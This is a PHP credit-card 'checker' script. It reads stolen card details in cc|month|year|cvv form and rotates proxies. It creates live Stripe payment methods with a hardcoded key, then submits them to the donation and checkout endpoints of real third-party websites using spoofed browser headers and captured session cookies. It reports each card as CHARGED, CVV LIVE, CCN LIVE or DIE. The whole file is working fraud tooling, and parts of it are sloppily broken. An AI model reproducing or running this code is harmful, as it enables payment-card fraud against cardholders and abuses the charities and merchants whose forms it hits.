<?php 
require 'function.php';
error_reporting(0);
//---------------------------------------//
//---------------------------------------//
#if(file_exists(getcwd().('/cookie.txt'))){
    #@unlink("cookie.txt");
$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function random_strings($length_of_string) 
{
    $str_result2 = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; 
    return substr(str_shuffle($str_result2),  
                       0, $length_of_string); 
}
 $mail = 'nexon'.random_strings(5).'';
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);


function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

#-------- 1st req----------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers[] = 'accept: application/json';
$headers[] = 'accept-encoding: gzip, deflate, br';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-length: 498';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'origin: https://js.stripe.com';
$headers[] = 'referer: https://js.stripe.com/';
$headers[] = 'sec-ch-ua: "Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[address][postal_code]=11120&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]=02&card[exp_year]=25&guid=75e70985-bff3-4390-903a-34f5bfea63442afb57&muid=574b9c92-a8ce-435d-b8b1-3685d0ef0ca4de44da&sid=541c2812-4160-4cdc-aa0f-6c4efc6b263497066a&pasted_fields=number&payment_user_agent=stripe.js%2F72c5b37d6%3B+stripe-js-v3%2F72c5b37d6&time_on_page=52127&key=pk_live_51J7LoYDs5inaEIdgpoYfHlXcybxruYUCvWf6Ke85oERDMrPItQKUoqIY0ViJTJo0ibC1AEa6dAMyk8Bb38Wl0uAU00tNfMukzy');
$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));
if(empty($id)) {
    $msg = trim(strip_tags(getStr($result1,'"message": "','"')));
echo '#Die</span>  </span>CC:  '.$lista.'</span>  <br>result1: '.$msg.' ❌ </span><br>';
exit;
}
$l4= trim(strip_tags(getStr($result1,'"last4: "','"')));
$brnd= trim(strip_tags(getStr($result1,'"brand: "','"')));
$created= trim(strip_tags(getStr($result1,'"created: "','"')));


#-------------3req----


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://zeninlondon.org/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'accept-encoding: gzip, deflate, br';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'cache-control: max-age=0';
$headers[] = 'content-length: 2591';
$headers[] = 'content-type: multipart/form-data; boundary=----WebKitFormBoundarywmPBucvL1TT4Cfp7';
$headers[] = 'cookie: cookielawinfo-checkbox-necessary=yes; cookielawinfo-checkbox-non-necessary=yes; __stripe_mid=574b9c92-a8ce-435d-b8b1-3685d0ef0ca4de44da; __stripe_sid=541c2812-4160-4cdc-aa0f-6c4efc6b263497066a; viewed_cookie_policy=yes; PHPSESSID=4da7fb8b4812251c430ab2fe976d3e10';
$headers[] = 'origin: https://zeninlondon.org';
$headers[] = 'referer: https://zeninlondon.org/donate/';
$headers[] = 'sec-ch-ua: "Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: iframe';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-user: ?1';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=gfstripe_update_payment_intent&nonce=5a1d6999d0&payment_intent=pi_3MQ2ulDs5inaEIdg2djhSIOI&payment_method%5Bid%5D='.$id.'&payment_method%5Bobject%5D=payment_method&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bcity%5D=&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bcountry%5D=&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bline1%5D=&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bline2%5D=&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bpostal_code%5D=11120&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bstate%5D=&payment_method%5Bbilling_details%5D%5Bemail%5D=&payment_method%5Bbilling_details%5D%5Bname%5D=&payment_method%5Bbilling_details%5D%5Bphone%5D=&payment_method%5Bcard%5D%5Bbrand%5D='.$brnd.'&payment_method%5Bcard%5D%5Bchecks%5D%5Baddress_line1_check%5D=&payment_method%5Bcard%5D%5Bchecks%5D%5Baddress_postal_code_check%5D=&payment_method%5Bcard%5D%5Bchecks%5D%5Bcvc_check%5D=&payment_method%5Bcard%5D%5Bcountry%5D=US&payment_method%5Bcard%5D%5Bexp_month%5D='.$mes.'&payment_method%5Bcard%5D%5Bexp_year%5D='.$ano.'&payment_method%5Bcard%5D%5Bfunding%5D=debit&payment_method%5Bcard%5D%5Bgenerated_from%5D=&payment_method%5Bcard%5D%5Blast4%5D='.$l4.'&payment_method%5Bcard%5D%5Bnetworks%5D%5Bavailable%5D%5B%5D='.$brnd.'&payment_method%5Bcard%5D%5Bnetworks%5D%5Bpreferred%5D=&payment_method%5Bcard%5D%5Bthree_d_secure_usage%5D%5Bsupported%5D=true&payment_method%5Bcard%5D%5Bwallet%5D=&payment_method%5Bcreated%5D='.$created.'&payment_method%5Bcustomer%5D=&payment_method%5Blivemode%5D=true&payment_method%5Btype%5D=card&currency=GBP&amount=500&feed_id=5');

$result2 = curl_exec($ch);
$idd= trim(strip_tags(getStr($result1,'"id: "','"')));
$client_secret= trim(strip_tags(getStr($result1,'"client_secret: "','"')));
#---------------2nd req ---------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://gregalder.com/yardposts/membership-account/membership-checkout/?level=3');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'POST /yardposts/membership-account/membership-checkout/?level=3 HTTP/1.1';
$headers[] = 'Host: gregalder.com';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Cache-Control: max-age=0';
$headers[] = 'sec-ch-ua: "Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Origin: https://gregalder.com';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 10; M2006C3MII) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-User: ?1';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Referer: https://gregalder.com/yardposts/membership-account/membership-checkout/?level=3';
$headers[] = 'Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6,zh;q=0.5';
$headers[] = 'Cookie: pmpro_visit=1; __stripe_mid=6b3b4575-b860-4192-a6ae-227637d1f3106e4773; PHPSESSID=heq8kpc5b4g9lp9o8896ouh5th; tk_or=%22android-app%3A%2F%2Forg.telegram.messenger%2F%22; tk_r3d=%22android-app%3A%2F%2Forg.telegram.messenger%2F%22; tk_lr=%22android-app%3A%2F%2Forg.telegram.messenger%2F%22; __stripe_sid=494876b1-a9e2-42fd-8308-19b72008fcbeacd04e';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundarywmPBucvL1TT4Cfp7
Content-Disposition: form-data; name="input_4"

One Time Donation
------WebKitFormBoundarywmPBucvL1TT4Cfp7
Content-Disposition: form-data; name="input_1"

£5.00|5
------WebKitFormBoundarywmPBucvL1TT4Cfp7
Content-Disposition: form-data; name="input_7"

jhhjb
------WebKitFormBoundarywmPBucvL1TT4Cfp7
Content-Disposition: form-data; name="input_9"

agcg@gmail.com
------WebKitFormBoundarywmPBucvL1TT4Cfp7
Content-Disposition: form-data; name="input_13"

NO - not right now
------WebKitFormBoundarywmPBucvL1TT4Cfp7
Content-Disposition: form-data; name="input_5"

£ 5.00
------WebKitFormBoundarywmPBucvL1TT4Cfp7
Content-Disposition: form-data; name="stripe_response"

{"id":"'.$idd.'","client_secret":"'.$client_secret.',"amount":500}
------WebKitFormBoundarywmPBucvL1TT4Cfp7
Content-Disposition: form-data; name="stripe_credit_card_last_four"

'.$l4.'
------WebKitFormBoundarywmPBucvL1TT4Cfp7
Content-Disposition: form-data; name="stripe_credit_card_type"

'.$brnd.'
------WebKitFormBoundarywmPBucvL1TT4Cfp7
Content-Disposition: form-data; name="gform_ajax"

form_id=8&title=&description=&tabindex=0
------WebKitFormBoundarywmPBucvL1TT4Cfp7
Content-Disposition: form-data; name="is_submit_8"

1
------WebKitFormBoundarywmPBucvL1TT4Cfp7
Content-Disposition: form-data; name="gform_submit"

8
------WebKitFormBoundarywmPBucvL1TT4Cfp7
Content-Disposition: form-data; name="gform_unique_id"

63c246dd1c034
------WebKitFormBoundarywmPBucvL1TT4Cfp7
Content-Disposition: form-data; name="state_8"

WyJ7XCIxXCI6W1wiMDJkNjE2Mjk5YTU0ZTFjYzc1NTQ2NzMzNmNjY2M5YTFcIixcIjhjZGMxYmJjNjcwOTg3MGM4YzQ3YzA3ODUzNzFkYjE0XCIsXCI3MDExOTg2NjY2NTdlZjUzYzg4OWNmYTRhZWI5ODg0ZlwiLFwiODhjZTlhNjVmMzUyOTdlMDIzMGYwOGZlZmIzMGUzY2ZcIixcImFjZjQ1N2IzMmQzN2FiODQyYjI2N2JkMzE3NTE1Y2U2XCIsXCIzYTIyNGExY2NjNmY4Y2YwZDQ3YzBmZjRmNzVmYTM1YlwiLFwiNTc1MDRlNDNjZWQzN2Q2NTJjMmI3Mjg1MzdhYTYyMTNcIixcImRhMDBiODFlMWQ4MjI5YjcwOGU1YTMwZWZhZTJhZDYyXCJdLFwiMTNcIjpbXCIxZjI1ODE1ZDFiMDE5NTY4YjZhMDAyOTBkZWZlM2Q0N1wiLFwiMTM4MjJlMzg0Y2NkOWQwNGQ5NzJkZTU3YzYyOWNhYzdcIl19IiwiMzExZjExMGE1Mzg1ZWExYzEwMjY5MDU3ZTJkYTFmNDMiXQ==
------WebKitFormBoundarywmPBucvL1TT4Cfp7
Content-Disposition: form-data; name="gform_target_page_number_8"

0
------WebKitFormBoundarywmPBucvL1TT4Cfp7
Content-Disposition: form-data; name="gform_source_page_number_8"

1
------WebKitFormBoundarywmPBucvL1TT4Cfp7
Content-Disposition: form-data; name="gform_field_values"


------WebKitFormBoundarywmPBucvL1TT4Cfp7--');
$result2 = curl_exec($ch);
 //$msg= trim(strip_tags(getStr($result2,'"message: "','"')));

# ---------------------------------------#

# ---------------- [Responses] ------- ---------- #
if(strpos($result2, "Successful")) {
    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span>  <br> Payment Intent Confirmed ⚠️ </span><br>';
exit;
    }

elseif(strpos($result2, "Your Order is Confirmed")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>#CHARGED '.$amt.' ✅ </span><br>';
    
exit;
}
elseif(strpos($result2, "succeeded")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>#CHARGED '.$amt.' ✅ </span><br>';
    
exit;
}
elseif(strpos($result2, "Congratulations")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>#CHARGED '.$amt.' ✅ Confirmed </span><br>';
   
exit;
}
elseif(strpos($result2, "Membership Confirmation")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>#CHARGED '.$amt.' ✅  Confirmed
    </span><br>';
    
exit;
}
elseif(strpos($result2, "Invoice")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>#CHARGED '.$amt.' ✅  Confirmed
    </span><br>';
    
exit;
}
elseif(strpos($result2, "Your Membership Is confirmed")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>#CHARGED '.$amt.' ✅  Confirmed
    </span><br>';
    
exit;
}

elseif(strpos($result2, "Your card has insufficient funds.")) {

    echo '#CVV</span>  </span>CC:  '.$lista.'</span>  <br> Insufficient Funds <br>    </span><br>';
    exit;
    }



elseif(strpos($result2, "incorrect_zip")) {

    echo '#CVV</span>  </span>CC:  '.$lista.'</span>  <br> #CVV LIVE ✅  </span><br>';
    exit;
    }

elseif(strpos($result2, 'security code is incorrect.')) {

    echo '#CCN </span>  </span>CC:  '.$lista.'</span>  <br> 𝗖𝗖𝗡 𝗟𝗜𝗩𝗘 ✅  </span><br>';
    exit;
    }
    elseif(strpos($result2, 'security code is invalid.')) {

        echo '#CCN </span>  </span>CC:  '.$lista.'</span>  <br> SECURITY CODE IS INVALID  ✅  </span><br>';
        exit;
        }
    elseif(strpos($result2, "Security code is incorrect")) {

    echo '#CCN </span>  </span>CC:  '.$lista.'</span>  <br> 𝗖𝗖𝗡 𝗟𝗜𝗩𝗘 ✅  </span><br>';
    }
  
elseif(strpos($result2, "transaction_not_allowed")) {

    echo '#CVV</span>  </span>CC:  '.$lista.'</span>  <br> TRANSACTION NOT ALLOWED ❌  </span><br>';
    exit;
    }
elseif(strpos($result2, "does not support this type of purchase")) {

    echo '#CVV</span>  </span>CC:  '.$lista.'</span>  <br> Card does not support ❌  </span><br>';
    exit;
    }
    

elseif(strpos($result2, "stripe_3ds2_fingerprint")) {


    echo '#CVV</span>  </span>CC:  '.$lista.'</span>  <br> 3DSECURE REQUIRED  </span><br>';
    exit;
    }
elseif(strpos($result2, "generic_decline")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br> GENERIC DECLINE ❌ </span><br>';
    }

elseif(strpos($result2, "do_not_honor")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br> DO NOT HONOR ❌ </span><br>';
}

elseif(strpos($result2, "fraudulent")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br> FRAUDULENT ❌ </span><br>';
}
elseif(strpos($result2, "intent_confirmation_challenge")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br> Captcha ⚠️ </span><br>';
    }
elseif(strpos($result2, 'Your card was declined.')) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br> Your card was declined❌ </span><br>';
}

elseif(strpos($result1, 'Your card number is incorrect.')) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br> Incorrect Card Number❌ </span><br>';
}
elseif(strpos($result2, 'Invalid Account')) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Account Invalid </span><br>';
}
elseif(strpos($result2, 'expired')) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Expired </span><br>';
}

else {
    echo '#DIE </span>  </span>CC:  '.$lista.'</span><br>'.$result2.' </span><br>';
    
}

curl_close($ch);
ob_flush();

?>